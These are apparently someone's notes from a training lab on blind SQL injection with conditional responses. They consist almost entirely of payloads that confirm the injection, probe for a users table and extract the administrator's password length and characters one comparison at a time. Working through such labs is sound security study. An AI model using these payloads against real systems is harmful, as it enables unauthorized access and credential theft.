# Lab: Blind SQL injection with conditional responses

test : if we can use sql injection
```
payload : xyz' or 'a'='a
```
Test if we have table users
```
payload: xyz' or substring((select 'a' from user),1,1) = 'a
```
test if we have column password :
```
xyz' OR SUBSTRING((SELECT CONCAT(substring(u.password,1,1),'a') FROM Users as u where u.username='administrator' LIMIT 1), 2, 1) = 'a
```
find the length of the password : 
```
aa' or  length((select password from users where username='administrator' limit 1)) = '20  # 20 characters ! 
```
test if the letter greater than 't' : 
```
xyz' OR SUBSTRING((SELECT password FROM Users as u where u.username='administrator' LIMIT 1), 1, 1) > 't
```
test if the letter = 'w' : 
```
xyz' OR SUBSTRING((SELECT password FROM Users as u where u.username='administrator' LIMIT 1), 1, 1) = 'w
```
